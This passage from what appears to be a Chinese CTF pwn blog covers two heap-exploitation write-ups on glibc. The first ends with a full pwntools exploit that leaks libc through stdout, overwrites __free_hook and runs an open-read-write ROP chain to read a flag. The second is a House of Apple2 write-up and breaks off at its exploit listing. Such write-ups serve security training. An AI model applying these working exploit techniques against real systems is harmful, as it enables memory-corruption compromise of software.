class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(chunk, <span class="number">0</span>, size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个函数可以置空 tcache key，但只能执行一次</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序拥有一次任意写的机会，但是没有泄露，对于这种要爆破的程序，建议先关地址随机化：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>
<p>只能先打 stdout 泄露 libc，思路如下：</p>
<ul>
<li>先利用 double free 错位写一个 free tcache</li>
<li>伪造它的 presize，size(较大值)，FD(覆盖低位)</li>
<li>把它申请出来然后释放，就可以得到 unsorted chunk</li>
<li>先申请一次 unsorted chunk，并将 main_arena 覆盖为 stdout </li>
<li>如果堆风水够好的话，就会发现 stdout 在 tcache[0x70] 中（最好是这种情况，我也尝试过用 unsorted chunk 来覆盖其他的 free tcache，结果总是超出“申请模块”的次数限制）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span> [  <span class="number">6</span>]: <span class="number">0x55555555b800</span> —▸ <span class="number">0x7ffff7f896a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x80</span> [  <span class="number">5</span>]: <span class="number">0x55555555b870</span> —▸ <span class="number">0x55555555b980</span> —▸ <span class="number">0x55555555bc10</span> —▸ <span class="number">0x55555555bec0</span> —▸ <span class="number">0x55555555ba90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>完成泄露以后，就可以利用现成的 unsorted chunk 来修改与其重叠的 free tcache，把 free_hook 写入到 tcachebin 中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80</span> [  <span class="number">5</span>]: <span class="number">0x55555555b870</span> —▸ <span class="number">0x7ffff7f8bb28</span> (__free_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>最后就是一个堆上 ORW 的过程了，因为没有泄露堆地址，所以常规的 <code>setcontext+61</code> 和 <code>libc.sym[&#39;svcudp_reply&#39;]+26</code> 都没有作用，只能用特殊的 magic gadget 来进行栈迁移</p>
<p>我们先在 <code>free_hook</code> 的位置写一个 <code>puts</code>，然后分析寄存器的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br><span class="line"> RBX  <span class="number">0x555555555950</span> ◂— endbr64 </span><br><span class="line">*RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0xfffffffffffffffe</span></span><br><span class="line">*RDI  <span class="number">0x7ffff7f8bb28</span> (__free_hook) —▸ <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br><span class="line">*RSI  <span class="number">0x555555555778</span> ◂— lea    rax, [rip + <span class="number">0x2899</span>]</span><br><span class="line">*R8   <span class="number">0x1999999999999999</span></span><br><span class="line">*R9   <span class="number">0x0</span></span><br><span class="line">*R10  <span class="number">0x7ffff7f3bac0</span> (_nl_C_LC_CTYPE_toupper+<span class="number">512</span>) ◂— <span class="number">0x100000000</span></span><br><span class="line">*R11  <span class="number">0x7ffff7f3c3c0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— <span class="number">0x2000200020002</span></span><br><span class="line"> R12  <span class="number">0x555555555240</span> ◂— endbr64 </span><br><span class="line"> R13  <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line">*RBP  <span class="number">0x7fffffffde40</span> —▸ <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffde28</span> —▸ <span class="number">0x555555555778</span> ◂— lea    rax, [rip + <span class="number">0x2899</span>]</span><br><span class="line">*RIP  <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>只有 RDI 寄存器可以利用</li>
<li>因此我们要把 ORW 链写入 <code>free_hook</code>，然后利用 RDI 寄存器来进行栈迁移</li>
<li>首先，在完成栈迁移之前我们不能使用栈，因此需要 <code>call</code> 来连接 gadget：（可以先把带有 <code>call</code> 的 gadget 保存到另一个文件中，然后搜索 RDI）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, qword ptr [rdi + <span class="number">8</span>]; call qword ptr [rax + <span class="number">0x30</span>]; </span><br></pre></td></tr></table></figure>
<ul>
<li>想这种基于 RAX 的 <code>call</code> 我们一般不采用，虽然它很多，但是很难进行栈迁移</li>
<li>我们通常使用 RDI，RSI，RDX，RBP 这4个寄存器来做栈迁移，因此优先使用带有它们的 <code>call</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]; mov qword ptr [rsp], rax; call qword ptr [rdx + <span class="number">0x20</span>]; </span><br><span class="line">mov rsp, rdx; ret; </span><br></pre></td></tr></table></figure>
<p>由于写入长度受限，我们需要手动执行一次 <code>gets</code> 写入 ORW 链</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./only&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 1</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;172.51.221.20&#x27;,&#x27;9999&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice &gt;&gt; &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>():</span></span><br><span class="line">    choice(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>():</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0xe0</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dele()</span><br><span class="line">    fill()</span><br><span class="line">    dele()</span><br><span class="line"></span><br><span class="line">    success(<span class="string">&quot;stdout &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]))</span><br><span class="line">    _IO_2_1_stdout_offset = <span class="number">0x96a0</span></span><br><span class="line">    head_offset = <span class="number">0xb7f0</span></span><br><span class="line">    head_offset2 = <span class="number">0xb800</span></span><br><span class="line">   </span><br><span class="line">    add(<span class="number">0xe0</span>,p16(head_offset))</span><br><span class="line">    add(<span class="number">0xe0</span>,p16(head_offset))</span><br><span class="line">    add(<span class="number">0xe0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x491</span>)+p16(head_offset2))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dele()</span><br><span class="line">    add(<span class="number">0x30</span>, p16(_IO_2_1_stdout_offset))</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00\n&#x27;</span></span><br><span class="line">    add(<span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook = libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    puts_libc = libc_base+libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    gets_libc = libc_base+libc.sym[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))  </span><br><span class="line">    </span><br><span class="line">    gadget1 = libc_base + <span class="number">0x00000000001547a0</span></span><br><span class="line">    <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    gadget2 = libc_base + <span class="number">0x000000000005e650</span></span><br><span class="line">    <span class="comment"># mov rsp, rdx; ret; </span></span><br><span class="line">    gadget3 = libc_base + <span class="number">0x000000000004a5c5</span></span><br><span class="line">    <span class="comment"># add rsp, 0x28; ret; </span></span><br><span class="line">    success(<span class="string">&quot;gadget1 &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(gadget1))</span><br><span class="line"></span><br><span class="line">    pop_rax_ret = libc_base + <span class="number">0x000000000004a550</span></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011c1e1</span></span><br><span class="line">    syscall_ret = libc_base + <span class="number">0x0000000000066229</span></span><br><span class="line">    success(<span class="string">&quot;syscall_ret &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(syscall_ret))</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x81</span>) + p64(free_hook) </span><br><span class="line">    add(<span class="number">0xe0</span>, payload)</span><br><span class="line"></span><br><span class="line">    flag_addr = free_hook + <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">    ORW =  <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="comment"># open(bss_addr,0)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload = p64(gadget1) + p64(free_hook+<span class="number">0x10</span>) </span><br><span class="line">    payload += p64(gadget3) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(gadget2) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(free_hook+<span class="number">0x50</span>) + p64(gets_libc)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    dele()</span><br><span class="line"></span><br><span class="line">    p.sendline(ORW)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    elf = ELF(challenge)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(challenge,timeout=<span class="number">1</span>)</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">elf = ELF(challenge)</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">p = process(challenge)</span></span><br><span class="line"><span class="string">pwn()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/10/House%20Of%20Apple-2.34-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/10/House%20Of%20Apple-2.34-64/" class="post-title-link" itemprop="url">House Of Apple-2.34-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-10 02:25:44 / Modified: 02:30:26" itemprop="dateCreated datePublished" datetime="2022-11-10T02:25:44+08:00">2022-11-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>oneday</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(GNU libc)</span> stable release version 2.34.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">oneday: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=f0ed246b7bd4e5f07caab6ba718a7e0e05c918b7, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>禁用 <code>execve</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>使用 House Of Apple2：</p>
<ul>
<li>先用一个 largebin attack 来劫持 <code>stderr _IO_FILE</code> </li>
<li>完成 House Of Apple2 的伪造</li>
<li>main 函数返回后执行 <code>exit</code>，触发 IO 流</li>
</ul>
<p>这其中需要注意一个问题，该程序只有一次输出的机会，也就是说 largebin attack 和 <code>_IO_FILE</code> 的伪造必须放入用一个 chunk 中</p>
<p>但 largebin attack 的效果是把 unsorted chunk 放入 <code>_IO_list_all</code>，那么就必须先利用堆风水让 unsorted chunk 和 large chunk 重叠</p>
<ul>
<li>具体的方法就是释放遗留在 chunk_list 中的 chunk 指针（向 large chunk 写入数据时，就要伪造目标 chunk，使其合法）</li>
</ul>
<p>调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; target</span><br></pre></td></tr></table></figure>
<p>本题目还需要一个特殊的 gadget 来劫持程序流 <code>libc.sym[&#39;svcudp_reply&#39;]+26</code>，它的效果和 <code>setcontext+61</code> 类似，但它需要控制 RDI 寄存器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f02e97842ba</span> &lt;svcudp_reply+<span class="number">26</span>&gt;    mov    rbp, qword ptr [rdi + <span class="number">0x48</span>]</span><br><span class="line">  <span class="number">0x7f02e97842be</span> &lt;svcudp_reply+<span class="number">30</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f02e97842c2</span> &lt;svcudp_reply+<span class="number">34</span>&gt;    lea    r13, [rbp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x7f02e97842c6</span> &lt;svcudp_reply+<span class="number">38</span>&gt;    mov    dword ptr [rbp + <span class="number">0x10</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x7f02e97842cd</span> &lt;svcudp_reply+<span class="number">45</span>&gt;    mov    rdi, r13</span><br><span class="line">  <span class="number">0x7f02e97842d0</span> &lt;svcudp_reply+<span class="number">48</span>&gt;    call   qword ptr [rax + <span class="number">0x28</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>由于本题目没法控制 RDX 寄存器，因此才用这种方式来替代 <code>setcontext+61</code></li>
<li>RDI 寄存器其实就指向 <code>fake_IO_FILE</code> 的起始地址，也就是 <code>fake_io_addr</code></li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 